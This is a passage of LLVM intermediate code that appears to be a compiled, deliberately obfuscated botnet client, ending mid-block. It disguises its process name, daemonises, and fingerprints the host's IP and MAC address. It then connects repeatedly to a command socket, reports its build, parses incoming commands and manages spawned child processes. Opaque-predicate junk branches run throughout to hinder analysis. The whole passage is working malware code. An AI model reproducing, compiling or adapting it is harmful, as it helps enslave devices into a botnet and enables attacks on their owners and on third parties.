  %184 = sub i32 %182, 1
  %185 = mul i32 %182, %184
  %186 = urem i32 %185, 2
  %187 = icmp eq i32 %186, 0
  %188 = icmp slt i32 %183, 10
  %189 = or i1 %187, %188
  br i1 %189, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %190

; <label>:190:                                    ; preds = %originalBBpart220
  %191 = load i32, i32* %10, align 4
  %192 = add nsw i32 %191, 1
  store i32 %192, i32* %10, align 4
  br label %159

; <label>:193:                                    ; preds = %159
  br label %194

; <label>:194:                                    ; preds = %193, %129
  %195 = load i32, i32* %2, align 4
  %196 = call i32 @close(i32 %195)
  br label %197

; <label>:197:                                    ; preds = %194, %52, %45, %15
  %198 = load i32, i32* %1, align 4
  ret i32 %198

originalBBalteredBB:                              ; preds = %originalBB, %16
  %199 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %199, i8 0, i64 16, i32 4, i1 false)
  %200 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %200, align 4
  %201 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.117, i32 0, i32 0)) #2
  %202 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %203 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %202, i32 0, i32 0
  store i32 %201, i32* %203, align 4
  %204 = call zeroext i16 @htons(i16 zeroext 53) #13
  %205 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %204, i16* %205, align 2
  %206 = load i32, i32* %2, align 4
  %207 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %208 = call i32 @connect(i32 %206, %struct.sockaddr* %207, i32 16)
  store i32 %208, i32* %4, align 4
  %209 = load i32, i32* %4, align 4
  %210 = icmp eq i32 %209, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %63
  %211 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0)) #10
  %213 = icmp ne i8* %212, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %90
  %214 = load i8*, i8** %9, align 8
  %215 = getelementptr inbounds i8, i8* %214, i32 1
  store i8* %215, i8** %9, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %109
  %216 = load i8*, i8** %9, align 8
  store i8 0, i8* %216, align 1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %135
  %217 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %218 = bitcast %union.anon.6* %217 to [16 x i8]*
  %219 = getelementptr inbounds [16 x i8], [16 x i8]* %218, i32 0, i32 0
  %220 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %221 = call i8* @strcpy(i8* %219, i8* %220) #2
  %222 = load i32, i32* %2, align 4
  %223 = call i32 (i32, i64, ...) @ioctl(i32 %222, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %162
  %224 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %225 = bitcast %union.anon.7* %224 to %struct.sockaddr*
  %226 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %225, i32 0, i32 1
  %227 = getelementptr inbounds [14 x i8], [14 x i8]* %226, i32 0, i32 0
  %228 = load i32, i32* %10, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds i8, i8* %227, i64 %229
  %231 = load i8, i8* %230, align 1
  %232 = load i32, i32* %10, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %233
  store i8 %231, i8* %234, align 1
  br label %originalBB18
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.120, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.121, i32 0, i32 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.122, i32 0, i32 0), i8* %25)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = call i8* @strncpy(i8* %29, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.123, i32 0, i32 0), i64 %33) #2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.121, i32 0, i32 0), i8** %36, align 8
  %37 = load i8*, i8** %6, align 8
  %38 = ptrtoint i8* %37 to i64
  %39 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %38, i32 0, i32 0, i32 0)
  %40 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %41 = call i32 @getpid() #2
  %42 = xor i32 %40, %41
  call void @srand(i32 %42) #2
  %43 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %44 = call i32 @getpid() #2
  %45 = xor i32 %43, %44
  call void @init_rand(i32 %45)
  %46 = call i32 @getOurIP()
  %47 = call i32 @fork() #2
  store i32 %47, i32* %7, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %49, label %52

; <label>:49:                                     ; preds = %2
  %50 = load i32, i32* %7, align 4
  %51 = call i32 @waitpid(i32 %50, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:52:                                     ; preds = %2
  %53 = load i32, i32* @x.87
  %54 = load i32, i32* @y.88
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %52
  %61 = load i32, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  %63 = load i32, i32* @x.87
  %64 = load i32, i32* @y.88
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %62, label %114, label %71

; <label>:71:                                     ; preds = %originalBBpart2
  %72 = call i32 @fork() #2
  store i32 %72, i32* %8, align 4
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %71
  call void @exit(i32 0) #14
  unreachable

; <label>:75:                                     ; preds = %71
  %76 = load i32, i32* @x.87
  %77 = load i32, i32* @y.88
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %75
  %84 = load i32, i32* %8, align 4
  %85 = icmp ne i32 %84, 0
  %86 = load i32, i32* @x.87
  %87 = load i32, i32* @y.88
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %85, label %95, label %94

; <label>:94:                                     ; preds = %originalBBpart24
  br label %96

; <label>:95:                                     ; preds = %originalBBpart24
  br label %96

; <label>:96:                                     ; preds = %95, %94
  %97 = load i32, i32* @x.87
  %98 = load i32, i32* @y.88
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %96
  %105 = load i32, i32* @x.87
  %106 = load i32, i32* @y.88
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %113

; <label>:113:                                    ; preds = %originalBBpart28
  br label %115

; <label>:114:                                    ; preds = %originalBBpart2
  br label %115

; <label>:115:                                    ; preds = %114, %113
  br label %116

; <label>:116:                                    ; preds = %115
  %117 = call i32 @setsid() #2
  %118 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i32 0, i32 0)) #2
  %119 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %120

; <label>:120:                                    ; preds = %781, %123, %116
  %121 = call i32 @initConnection()
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %123, label %125

; <label>:123:                                    ; preds = %120
  %124 = call i32 @sleep(i32 5)
  br label %120

; <label>:125:                                    ; preds = %120
  %126 = load i32, i32* @mainCommSock, align 4
  %127 = call i8* @getBuild()
  %128 = call i32 (i32, i8*, ...) @sockprintf(i32 %126, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.125, i32 0, i32 0), i8* %127)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %129

; <label>:129:                                    ; preds = %780, %originalBBpart282, %416, %originalBBpart244, %125
  %130 = load i32, i32* @mainCommSock, align 4
  %131 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %132 = call i32 @recvLine(i32 %130, i8* %131, i32 4096)
  store i32 %132, i32* %11, align 4
  %133 = icmp ne i32 %132, -1
  br i1 %133, label %134, label %781

; <label>:134:                                    ; preds = %129
  %135 = load i32, i32* @x.87
  %136 = load i32, i32* @y.88
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %134
  store i32 0, i32* %12, align 4
  %143 = load i32, i32* @x.87
  %144 = load i32, i32* @y.88
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %151

; <label>:151:                                    ; preds = %302, %originalBBpart212
  %152 = load i32, i32* @x.87
  %153 = load i32, i32* @y.88
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
  %157 = icmp eq i32 %156, 0
  %158 = icmp slt i32 %153, 10
  %159 = or i1 %157, %158
  br i1 %159, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %151
  %160 = load i32, i32* %12, align 4
  %161 = sext i32 %160 to i64
  %162 = load i64, i64* @numpids, align 8
  %163 = icmp ult i64 %161, %162
  %164 = load i32, i32* @x.87
  %165 = load i32, i32* @y.88
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %163, label %172, label %305

; <label>:172:                                    ; preds = %originalBBpart216
  %173 = load i32*, i32** @pids, align 8
  %174 = load i32, i32* %12, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds i32, i32* %173, i64 %175
  %177 = load i32, i32* %176, align 4
  %178 = call i32 @waitpid(i32 %177, i32* null, i32 1)
  %179 = icmp sgt i32 %178, 0
  br i1 %179, label %180, label %301

; <label>:180:                                    ; preds = %172
  %181 = load i32, i32* %12, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %14, align 4
  br label %183

; <label>:183:                                    ; preds = %originalBBpart236, %180
  %184 = load i32, i32* @x.87
  %185 = load i32, i32* @y.88
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %183
  %192 = load i32, i32* %14, align 4
  %193 = zext i32 %192 to i64
  %194 = load i64, i64* @numpids, align 8
  %195 = icmp ult i64 %193, %194
  %196 = load i32, i32* @x.87
  %197 = load i32, i32* @y.88
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %195, label %204, label %250

; <label>:204:                                    ; preds = %originalBBpart220
  %205 = load i32, i32* @x.87
  %206 = load i32, i32* @y.88
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %204
  %213 = load i32*, i32** @pids, align 8
  %214 = load i32, i32* %14, align 4
  %215 = zext i32 %214 to i64
  %216 = getelementptr inbounds i32, i32* %213, i64 %215
  %217 = load i32, i32* %216, align 4
  %218 = load i32*, i32** @pids, align 8
  %219 = load i32, i32* %14, align 4
  %220 = sub i32 %219, 1
  %221 = zext i32 %220 to i64
  %222 = getelementptr inbounds i32, i32* %218, i64 %221
  store i32 %217, i32* %222, align 4
  %223 = load i32, i32* @x.87
  %224 = load i32, i32* @y.88
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart227, label %originalBB22alteredBB

originalBBpart227:                                ; preds = %originalBB22
  br label %231

; <label>:231:                                    ; preds = %originalBBpart227
  %232 = load i32, i32* @x.87
  %233 = load i32, i32* @y.88
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %231
  %240 = load i32, i32* %14, align 4
  %241 = add i32 %240, 1
  store i32 %241, i32* %14, align 4
  %242 = load i32, i32* @x.87
  %243 = load i32, i32* @y.88
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart236, label %originalBB29alteredBB

originalBBpart236:                                ; preds = %originalBB29
  br label %183

; <label>:250:                                    ; preds = %originalBBpart220
  %251 = load i32*, i32** @pids, align 8
  %252 = load i32, i32* %14, align 4
  %253 = sub i32 %252, 1
  %254 = zext i32 %253 to i64
  %255 = getelementptr inbounds i32, i32* %251, i64 %254
  store i32 0, i32* %255, align 4
  %256 = load i64, i64* @numpids, align 8
  %257 = add i64 %256, -1
  store i64 %257, i64* @numpids, align 8
  %258 = load i64, i64* @numpids, align 8
  %259 = add i64 %258, 1
  %260 = mul i64 %259, 4
  %261 = call noalias i8* @malloc(i64 %260) #2
  %262 = bitcast i8* %261 to i32*
  store i32* %262, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %263

; <label>:263:                                    ; preds = %294, %250
  %264 = load i32, i32* %14, align 4
  %265 = zext i32 %264 to i64
  %266 = load i64, i64* @numpids, align 8
  %267 = icmp ult i64 %265, %266
  br i1 %267, label %268, label %297

; <label>:268:                                    ; preds = %263
  %269 = load i32, i32* @x.87
  %270 = load i32, i32* @y.88
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %268
  %277 = load i32*, i32** @pids, align 8
  %278 = load i32, i32* %14, align 4
  %279 = zext i32 %278 to i64
  %280 = getelementptr inbounds i32, i32* %277, i64 %279
  %281 = load i32, i32* %280, align 4
  %282 = load i32*, i32** %13, align 8
  %283 = load i32, i32* %14, align 4
  %284 = zext i32 %283 to i64
  %285 = getelementptr inbounds i32, i32* %282, i64 %284
  store i32 %281, i32* %285, align 4
  %286 = load i32, i32* @x.87
  %287 = load i32, i32* @y.88
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %294

; <label>:294:                                    ; preds = %originalBBpart240
  %295 = load i32, i32* %14, align 4
  %296 = add i32 %295, 1
  store i32 %296, i32* %14, align 4
  br label %263

; <label>:297:                                    ; preds = %263
  %298 = load i32*, i32** @pids, align 8
  %299 = bitcast i32* %298 to i8*
  call void @free(i8* %299) #2
  %300 = load i32*, i32** %13, align 8
  store i32* %300, i32** @pids, align 8
  br label %301

; <label>:301:                                    ; preds = %297, %172
  br label %302

; <label>:302:                                    ; preds = %301
  %303 = load i32, i32* %12, align 4
  %304 = add nsw i32 %303, 1
  store i32 %304, i32* %12, align 4
  br label %151

; <label>:305:                                    ; preds = %originalBBpart216
  %306 = load i32, i32* %11, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %307
  store i8 0, i8* %308, align 1
  %309 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %309)
  %310 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %311 = call i8* @strstr(i8* %310, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i32 0, i32 0)) #10
  %312 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %313 = icmp eq i8* %311, %312
  br i1 %313, label %314, label %333

; <label>:314:                                    ; preds = %305
  %315 = load i32, i32* @x.87
  %316 = load i32, i32* @y.88
  %317 = sub i32 %315, 1
  %318 = mul i32 %315, %317
  %319 = urem i32 %318, 2
  %320 = icmp eq i32 %319, 0
  %321 = icmp slt i32 %316, 10
  %322 = or i1 %320, %321
  br i1 %322, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %314
  %323 = load i32, i32* @mainCommSock, align 4
  %324 = call i32 (i32, i8*, ...) @sockprintf(i32 %323, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i32 0, i32 0))
  %325 = load i32, i32* @x.87
  %326 = load i32, i32* @y.88
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %129

; <label>:333:                                    ; preds = %305
  %334 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %335 = call i8* @strstr(i8* %334, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.127, i32 0, i32 0)) #10
  %336 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %337 = icmp eq i8* %335, %336
  br i1 %337, label %338, label %339

; <label>:338:                                    ; preds = %333
  call void @exit(i32 0) #14
  unreachable

; <label>:339:                                    ; preds = %333
  %340 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %340, i8** %15, align 8
  %341 = load i8*, i8** %15, align 8
  %342 = load i8, i8* %341, align 1
  %343 = zext i8 %342 to i32
  %344 = icmp eq i32 %343, 33
  br i1 %344, label %345, label %780

; <label>:345:                                    ; preds = %339
  %346 = load i32, i32* @x.87
  %347 = load i32, i32* @y.88
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %345
  %354 = load i8*, i8** %15, align 8
  %355 = getelementptr inbounds i8, i8* %354, i64 1
  store i8* %355, i8** %16, align 8
  %356 = load i32, i32* @x.87
  %357 = load i32, i32* @y.88
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br label %364

; <label>:364:                                    ; preds = %408, %originalBBpart248
  %365 = load i32, i32* @x.87
  %366 = load i32, i32* @y.88
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %364
  %373 = load i8*, i8** %16, align 8
  %374 = load i8, i8* %373, align 1
  %375 = zext i8 %374 to i32
  %376 = icmp ne i32 %375, 32
  %377 = load i32, i32* @x.87
  %378 = load i32, i32* @y.88
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %376, label %385, label %406

; <label>:385:                                    ; preds = %originalBBpart252
  %386 = load i32, i32* @x.87
  %387 = load i32, i32* @y.88
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %385
  %394 = load i8*, i8** %16, align 8
  %395 = load i8, i8* %394, align 1
  %396 = zext i8 %395 to i32
  %397 = icmp ne i32 %396, 0
  %398 = load i32, i32* @x.87
  %399 = load i32, i32* @y.88
  %400 = sub i32 %398, 1
  %401 = mul i32 %398, %400
  %402 = urem i32 %401, 2
  %403 = icmp eq i32 %402, 0
  %404 = icmp slt i32 %399, 10
  %405 = or i1 %403, %404
  br i1 %405, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br label %406

; <label>:406:                                    ; preds = %originalBBpart256, %originalBBpart252
  %407 = phi i1 [ false, %originalBBpart252 ], [ %397, %originalBBpart256 ]
  br i1 %407, label %408, label %411

; <label>:408:                                    ; preds = %406
  %409 = load i8*, i8** %16, align 8
  %410 = getelementptr inbounds i8, i8* %409, i32 1
  store i8* %410, i8** %16, align 8
  br label %364

; <label>:411:                                    ; preds = %406
  %412 = load i8*, i8** %16, align 8
  %413 = load i8, i8* %412, align 1
  %414 = zext i8 %413 to i32
  %415 = icmp eq i32 %414, 0
  br i1 %415, label %416, label %417

; <label>:416:                                    ; preds = %411
  br label %129

; <label>:417:                                    ; preds = %411
  %418 = load i8*, i8** %16, align 8
  store i8 0, i8* %418, align 1
  %419 = load i8*, i8** %15, align 8
  %420 = getelementptr inbounds i8, i8* %419, i64 1
  store i8* %420, i8** %16, align 8
  %421 = load i8*, i8** %15, align 8
  %422 = load i8*, i8** %16, align 8
  %423 = call i64 @strlen(i8* %422) #10
  %424 = getelementptr inbounds i8, i8* %421, i64 %423
  %425 = getelementptr inbounds i8, i8* %424, i64 2
  store i8* %425, i8** %15, align 8
  br label %426

; <label>:426:                                    ; preds = %originalBBpart262, %417
  %427 = load i8*, i8** %15, align 8
  %428 = load i8*, i8** %15, align 8
  %429 = call i64 @strlen(i8* %428) #10
  %430 = sub i64 %429, 1
  %431 = getelementptr inbounds i8, i8* %427, i64 %430
  %432 = load i8, i8* %431, align 1
  %433 = zext i8 %432 to i32
  %434 = icmp eq i32 %433, 10
  br i1 %434, label %444, label %435

; <label>:435:                                    ; preds = %426
  %436 = load i8*, i8** %15, align 8
  %437 = load i8*, i8** %15, align 8
  %438 = call i64 @strlen(i8* %437) #10
  %439 = sub i64 %438, 1
  %440 = getelementptr inbounds i8, i8* %436, i64 %439
  %441 = load i8, i8* %440, align 1
  %442 = zext i8 %441 to i32
  %443 = icmp eq i32 %442, 13
  br label %444

; <label>:444:                                    ; preds = %435, %426
  %445 = phi i1 [ true, %426 ], [ %443, %435 ]
  br i1 %445, label %446, label %468

; <label>:446:                                    ; preds = %444
  %447 = load i32, i32* @x.87
  %448 = load i32, i32* @y.88
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %446
  %455 = load i8*, i8** %15, align 8
  %456 = load i8*, i8** %15, align 8
  %457 = call i64 @strlen(i8* %456) #10
  %458 = sub i64 %457, 1
  %459 = getelementptr inbounds i8, i8* %455, i64 %458
  store i8 0, i8* %459, align 1
  %460 = load i32, i32* @x.87
  %461 = load i32, i32* @y.88
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBBpart262, label %originalBB58alteredBB

originalBBpart262:                                ; preds = %originalBB58
  br label %426

; <label>:468:                                    ; preds = %444
  %469 = load i32, i32* @x.87
  %470 = load i32, i32* @y.88
  %471 = sub i32 %469, 1
  %472 = mul i32 %469, %471
  %473 = urem i32 %472, 2
  %474 = icmp eq i32 %473, 0
  %475 = icmp slt i32 %470, 10
  %476 = or i1 %474, %475
  br i1 %476, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %468
  %477 = load i8*, i8** %15, align 8
  store i8* %477, i8** %17, align 8
  %478 = load i32, i32* @x.87
  %479 = load i32, i32* @y.88
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %486

; <label>:486:                                    ; preds = %originalBBpart274, %originalBBpart266
  %487 = load i8*, i8** %15, align 8
  %488 = load i8, i8* %487, align 1
  %489 = zext i8 %488 to i32
  %490 = icmp ne i32 %489, 32
  br i1 %490, label %491, label %512

; <label>:491:                                    ; preds = %486
  %492 = load i32, i32* @x.87
